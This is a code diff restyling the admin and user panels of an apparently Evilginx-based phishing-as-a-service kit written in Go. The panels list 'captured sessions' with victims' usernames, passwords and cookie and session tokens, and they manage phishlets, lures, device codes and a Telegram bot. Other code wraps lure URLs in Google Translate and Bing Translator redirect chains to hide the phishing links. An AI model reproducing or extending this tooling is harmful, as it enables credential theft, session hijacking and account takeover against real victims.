 					if sub.ChainTranslate != "" {
-						linksCell += fmt.Sprintf(`<div class="label">Google Translate</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
-							template.HTMLEscapeString(sub.ChainTranslate), template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
+						linksCell += fmt.Sprintf(`<div class="chain-label">Google Translate</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
+							template.HTMLEscapeString(truncateStr(sub.ChainTranslate, 40)), template.HTMLEscapeString(sub.ChainTranslate))
 					}
 					if sub.ChainBing != "" {
-						linksCell += fmt.Sprintf(`<div class="label">Bing Translator</div><div class="link"><a href="%s" target="_blank">%s</a> <button class="btn-gray" style="font-size:.68rem;padding:1px 5px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
-							template.HTMLEscapeString(sub.ChainBing), template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
+						linksCell += fmt.Sprintf(`<div class="chain-label">Bing Translator</div><div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
+							template.HTMLEscapeString(truncateStr(sub.ChainBing, 40)), template.HTMLEscapeString(sub.ChainBing))
 					}
 					linksCell += `</div></details>`
 				}
@@ -1124,28 +1150,28 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
 <input type="hidden" name="action" value="approve_sub">
 <input type="hidden" name="sub_id" value="%d">
-<button type="submit" class="btn-green" style="font-size:.74rem;padding:2px 8px">✓ approve</button>
+<button type="submit" class="btn btn-green btn-xs">✓ Approve</button>
 </form> `, sub.Id)
 					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram">
 <input type="hidden" name="action" value="reject_sub">
 <input type="hidden" name="sub_id" value="%d">
-<button type="submit" style="font-size:.74rem;padding:2px 8px">✗ reject</button>
+<button type="submit" class="btn btn-ghost btn-xs">✗ Reject</button>
 </form>`, sub.Id)
 				} else {
 					actions += fmt.Sprintf(`<form class="inline" method="POST" action="/admin/panel?tab=telegram" onsubmit="return confirm('Delete subscription %d?')">
 <input type="hidden" name="action" value="delete_sub">
 <input type="hidden" name="sub_id" value="%d">
-<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
+<button type="submit" class="btn btn-danger btn-xs">Delete</button>
 </form>`, sub.Id, sub.Id)
 				}
 
 				b.WriteString(fmt.Sprintf(`<tr>
+<td class="mono" style="color:var(--t3)">%d</td>
 <td class="mono">%d</td>
-<td class="mono">%d</td>
-<td><span class="badge badge-red">%s</span><br><span style="color:#555;font-size:.72rem">%s</span></td>
+<td><span class="badge badge-purple">%s</span><br><span style="color:var(--t3);font-size:11px">%s</span></td>
 <td>%s</td>
 <td>%s</td>
-<td class="mono">%s</td>
+<td class="mono" style="font-size:11.5px">%s</td>
 <td>%s</td>
 <td>%s</td>
 </tr>`,
@@ -1160,13 +1186,11 @@ Tokens: <code style="color:#aaa">SILENTCODERSEMAIL</code> (victim email) · <cod
 		b.WriteString(`</div>`)
 	}
 
-	nav := `<a href="/admin/panel?tab=overview">overview</a>
-<a href="/admin/panel?tab=users">users</a>
-<a href="/admin/panel?tab=phishlets">phishlets</a>
-<a href="/admin/panel?tab=lures">lures</a>
-<a href="/admin/panel?tab=sessions">sessions</a>
-<a href="/admin/panel?tab=blacklist">blacklist</a>
-<a href="/admin/panel?tab=telegram">telegram bot</a>`
+	nav := `<a href="/admin/panel?tab=overview" class="topbar-link">Overview</a>
+<a href="/admin/panel?tab=sessions" class="topbar-link">Sessions</a>
+<a href="/admin/panel?tab=devicecodes" class="topbar-link">Device Codes</a>
+<a href="/admin/panel?tab=lures" class="topbar-link">Lures</a>
+<a href="/admin/panel?tab=telegram" class="topbar-link">Telegram</a>`
 
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	fmt.Fprint(w, panelPage("Admin Panel", nav, b.String()))
@@ -1211,16 +1235,19 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 
 	var b strings.Builder
 
-	b.WriteString(fmt.Sprintf(`<h1>Panel</h1>
-<p style="color:#555;margin:4px 0 16px">Logged in as <span style="color:#52b0e0;font-weight:600">%s</span></p>
-<div class="stats">
-  <div class="stat-box"><div class="n blue">%d</div><div class="l">Lures</div></div>
-  <div class="stat-box"><div class="n">%d</div><div class="l">Sessions</div></div>
-  <div class="stat-box"><div class="n green">%d</div><div class="l">With Tokens</div></div>
-</div>`, user.Username, len(lures), len(userSessions), totalTokens))
+	b.WriteString(fmt.Sprintf(`<div style="margin-bottom:22px">
+<h2 style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px">Welcome back, %s</h2>
+<p style="color:var(--t3);font-size:12.5px">Your personal phishing panel</p>
+</div>`, template.HTMLEscapeString(user.Username)))
 
-	// Lures with chain generation
-	b.WriteString(`<div class="section"><h2>Your Lures</h2>`)
+	b.WriteString(fmt.Sprintf(`<div class="stats" style="margin-bottom:24px">
+  <div class="stat"><div class="stat-n" style="color:var(--cyan)">%d</div><div class="stat-l">Lures</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--t1)">%d</div><div class="stat-l">Sessions</div></div>
+  <div class="stat"><div class="stat-n" style="color:var(--green)">%d</div><div class="stat-l">With Tokens</div></div>
+</div>`, len(lures), len(userSessions), totalTokens))
+
+	b.WriteString(`<div class="section">`)
+	b.WriteString(sectionHd("Your Lures"))
 	if len(lures) == 0 {
 		b.WriteString(`<div class="empty">No lures assigned to your account yet.</div>`)
 	} else {
@@ -1236,22 +1263,21 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 					lureURL = pu
 				}
 			}
-			// lureURL is the clean base URL — no login_hint placeholder here.
 
-			lureURLCell := `<span style="color:#383838">—</span>`
+			lureURLCell := `<span style="color:var(--t3)">—</span>`
 			if lureURL != "" {
-				lureURLCell = fmt.Sprintf(`<span class="url-cell">%s</span><br>
-<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-top:3px" onclick="cp(this)" data-copy="%s">copy</button>`,
+				lureURLCell = fmt.Sprintf(`<div class="url-cell">%s</div>
+<button class="btn btn-ghost btn-xs" style="margin-top:4px" onclick="cp(this)" data-copy="%s">Copy URL</button>`,
 					template.HTMLEscapeString(lureURL), template.HTMLEscapeString(lureURL))
 			}
 
-			redirectCell := `<span style="color:#383838">—</span>`
+			redirectCell := `<span style="color:var(--t3)">—</span>`
 			if l.RedirectUrl != "" {
-				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:.76rem">%s</a>`,
+				redirectCell = fmt.Sprintf(`<a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>`,
 					template.HTMLEscapeString(l.RedirectUrl), template.HTMLEscapeString(truncateStr(l.RedirectUrl, 40)))
 			}
 
-			chainCell := `<span style="color:#383838">—</span>`
+			chainCell := `<span style="color:var(--t3)">—</span>`
 			if lureURL != "" {
 				parsedURL, err := url.Parse(lureURL)
 				if err == nil {
@@ -1262,25 +1288,20 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 						bingLink2 := "https://www.bing.com/translator?to=en&url=" + url.QueryEscape(outer)
 
 						chainCell = fmt.Sprintf(`<details>
-<summary>▶ show chain links</summary>
+<summary>▶ Show chain links</summary>
 <div class="chain-box">
-  <div class="label">Google Translate (recommended)</div>
-  <div class="link">%s
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
-
-  <div class="label">Bing Translator (silent)</div>
-  <div class="link">%s
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>
-
-  <div class="label">Direct (3 hops)</div>
-  <div class="link">%s
-  <button class="btn-gray" style="font-size:.7rem;padding:2px 7px" onclick="cp(this)" data-copy="%s">copy</button></div>`,
+  <div class="chain-label">Google Translate</div>
+  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
+  <div class="chain-label">Bing Translator</div>
+  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>
+  <div class="chain-label">Direct Chain</div>
+  <div class="chain-link">%s <button class="btn btn-ghost btn-xs" onclick="cp(this)" data-copy="%s">Copy</button></div>`,
 							template.HTMLEscapeString(truncateStr(translateLink, 55)), template.HTMLEscapeString(translateLink),
 							template.HTMLEscapeString(truncateStr(bingLink2, 55)), template.HTMLEscapeString(bingLink2),
 							template.HTMLEscapeString(truncateStr(outer, 55)), template.HTMLEscapeString(outer),
 						)
 						for j, hop := range hops {
-							chainCell += fmt.Sprintf(`<div class="hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
+							chainCell += fmt.Sprintf(`<div class="chain-hop">layer %d → %s</div>`, j+1, template.HTMLEscapeString(hop))
 						}
 						chainCell += `</div></details>`
 					}
@@ -1288,8 +1309,8 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 			}
 
 			b.WriteString(fmt.Sprintf(`<tr>
-<td class="mono">%d</td>
-<td><span class="badge badge-red">%s</span></td>
+<td class="mono" style="color:var(--t3)">%d</td>
+<td><span class="badge badge-purple">%s</span></td>
 <td>%s</td>
 <td>%s</td>
 <td>%s</td>
@@ -1299,8 +1320,8 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 	}
 	b.WriteString(`</div>`)
 
-	// Sessions
-	b.WriteString(`<div class="section"><h2>Captured Sessions</h2>`)
+	b.WriteString(`<div class="section">`)
+	b.WriteString(sectionHd(fmt.Sprintf("Captured Sessions (%d)", len(userSessions))))
 	if len(userSessions) == 0 {
 		b.WriteString(`<div class="empty">No sessions captured yet.</div>`)
 	} else {
@@ -1313,6 +1334,10 @@ func (s *HttpServer) handleUserPanel(w http.ResponseWriter, r *http.Request) {
 }
 
 // ───────────────────────────── Shared helpers ──────────────────────────────
+
+func sectionHd(title string) string {
+	return fmt.Sprintf(`<div class="section-hd"><span class="section-title">%s</span><div class="section-line"></div></div>`, title)
+}
 
 func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenPerUser map[string]int) string {
 	if len(userList) == 0 {
@@ -1332,21 +1357,23 @@ func usersTable(userList []*database.User, allLures []*Lure, sessPerUser, tokenP
 		panelURL := fmt.Sprintf("/panel/%s", u.Token)
 		b.WriteString(fmt.Sprintf(`<tr>
 <td><span class="badge badge-blue">%s</span></td>
-<td><a href="%s" target="_blank" class="mono" style="font-size:.78rem">%s</a>
-<button class="btn-gray" style="font-size:.7rem;padding:2px 7px;margin-left:4px" onclick="cp(this)" data-copy="%s">copy</button></td>
-<td class="mono">%d</td>
-<td class="mono">%d</td>
-<td class="mono" style="color:#4cd44c">%d</td>
-<td class="mono">%s</td>
+<td>
+  <a href="%s" target="_blank" class="mono" style="font-size:11px;color:var(--t2)">%s</a>
+  <button class="btn btn-ghost btn-xs" style="margin-left:6px" onclick="cp(this)" data-copy="%s">Copy</button>
+</td>
+<td class="mono" style="color:var(--t2)">%d</td>
+<td class="mono" style="color:var(--t2)">%d</td>
+<td class="mono" style="color:var(--green);font-weight:700">%d</td>
+<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
 <td>
   <form class="inline" method="POST" action="/admin/panel?tab=users" onsubmit="return confirm('Delete %s?')">
     <input type="hidden" name="action" value="delete_user">
     <input type="hidden" name="id" value="%d">
-    <button type="submit" style="font-size:.74rem;padding:2px 8px">delete</button>
+    <button type="submit" class="btn btn-danger btn-xs">Delete</button>
   </form>
 </td></tr>`,
 			template.HTMLEscapeString(u.Username),
-			panelURL, truncateStr(panelURL, 38), panelURL,
+			panelURL, truncateStr(panelURL, 40), panelURL,
 			lureCount,
 			sessPerUser[u.Username],
 			tokenPerUser[u.Username],
@@ -1373,47 +1400,45 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 
 		tokenBadge := `<span class="badge badge-gray">none</span>`
 		if hasTokens {
-			tokenBadge = `<span class="badge badge-green">captured</span>`
+			tokenBadge = `<span class="badge badge-green">● captured</span>`
 		}
 
 		uname := template.HTMLEscapeString(sess.Username)
 		if uname == "" {
-			uname = `<span style="color:#383838">—</span>`
+			uname = `<span style="color:var(--t3)">—</span>`
 		}
 		pass := template.HTMLEscapeString(sess.Password)
 		if pass == "" {
-			pass = `<span style="color:#383838">—</span>`
+			pass = `<span style="color:var(--t3)">—</span>`
 		}
 
-		// Build expandable token detail
-		detail := `<span style="color:#383838">—</span>`
+		detail := `<span style="color:var(--t3)">—</span>`
 		if hasCreds || hasTokens {
 			tokenJSON, _ := json.MarshalIndent(map[string]interface{}{
 				"cookie_tokens": sess.CookieTokens,
 				"body_tokens":   sess.BodyTokens,
 				"http_tokens":   sess.HttpTokens,
 			}, "", "  ")
-			detailID := fmt.Sprintf("sess-%d", sess.Id)
-			detail = fmt.Sprintf(`<details id="%s">
+			detail = fmt.Sprintf(`<details>
 <summary>▶ view tokens</summary>
 <pre>%s</pre>
-</details>`, detailID, template.HTMLEscapeString(string(tokenJSON)))
+</details>`, template.HTMLEscapeString(string(tokenJSON)))
 		}
 
 		b.WriteString(fmt.Sprintf(`<tr>
-<td class="mono">%d</td>
-<td><span class="badge badge-red">%s</span></td>
+<td class="mono" style="color:var(--t3)">%d</td>
+<td><span class="badge badge-purple">%s</span></td>
 <td class="mono">%s</td>
 <td class="mono">%s</td>
 <td>%s</td>
-<td class="mono">%s</td>
-<td class="mono">%s</td>
+<td class="mono" style="color:var(--t2)">%s</td>
+<td class="mono" style="color:var(--t3);font-size:11px">%s</td>
 <td>%s</td>`,
 			sess.Id,
 			template.HTMLEscapeString(sess.Phishlet),
 			uname, pass, tokenBadge,
 			template.HTMLEscapeString(sess.RemoteAddr),
-			time.Unix(sess.UpdateTime, 0).Format("2006-01-02 15:04"),
+			time.Unix(sess.UpdateTime, 0).Format("Jan 2 15:04"),
 			detail,
 		))
 		if showDelete {
@@ -1421,7 +1446,7 @@ func sessionTable(sessions []*database.Session, showDelete bool) string {
 <form class="inline" method="POST" action="/admin/panel?tab=sessions">
 <input type="hidden" name="action" value="delete_session">
 <input type="hidden" name="session_id" value="%d">
-<button type="submit" style="font-size:.74rem;padding:2px 8px">del</button>
+<button type="submit" class="btn btn-danger btn-xs">Del</button>
 </form></td>`, sess.Id))
 		}
 		b.WriteString(`</tr>`)
@@ -1437,7 +1462,6 @@ func truncateStr(s string, n int) string {
 	return s[:n] + "…"
 }
 
-// createLureForm renders the "Create Lure" form HTML.
 func createLureForm(phishletNames []string, userList []*database.User) string {
 	if len(phishletNames) == 0 {
 		return `<div class="empty">No phishlets loaded. Add phishlet YAML files to the phishlets directory first.</div>`
@@ -1454,14 +1478,14 @@ func createLureForm(phishletNames []string, userList []*database.User) string {
 		userOpts += fmt.Sprintf(`<option value="%s">%s</option>`,
 			template.HTMLEscapeString(u.Username), template.HTMLEscapeString(u.Username))
 	}
-	return fmt.Sprintf(`<form method="POST" action="/admin/panel?tab=lures">
+	return fmt.Sprintf(`<div class="card"><form method="POST" action="/admin/panel?tab=lures">
 <input type="hidden" name="action" value="create_lure">
-<div class="form-row">
-  <select name="phishlet" required style="width:240px">%s</select>
-  <input type="text" name="path" placeholder="path (auto-generated if empty)" style="width:220px">
-  <input type="text" name="redirect_url" placeholder="redirect URL after capture (optional)" style="width:280px">
-  <select name="user_id" style="width:160px">%s</select>
-  <button type="submit" class="btn-blue">+ Create Lure</button>
+<div class="form-grid">
+  <div class="field"><label class="field-label">Phishlet</label><select name="phishlet" required>%s</select></div>
+  <div class="field"><label class="field-label">Path (auto if empty)</label><input type="text" name="path" placeholder="/abc12345"></div>
+  <div class="field"><label class="field-label">Redirect URL (optional)</label><input type="text" name="redirect_url" placeholder="https://..."></div>
+  <div class="field"><label class="field-label">Assign to User</label><select name="user_id">%s</select></div>
+  <div class="field" style="justify-content:flex-end"><button type="submit" class="btn btn-primary">+ Create Lure</button></div>
 </div>
-</form>`, opts, userOpts)
+</form></div>`, opts, userOpts)
 }
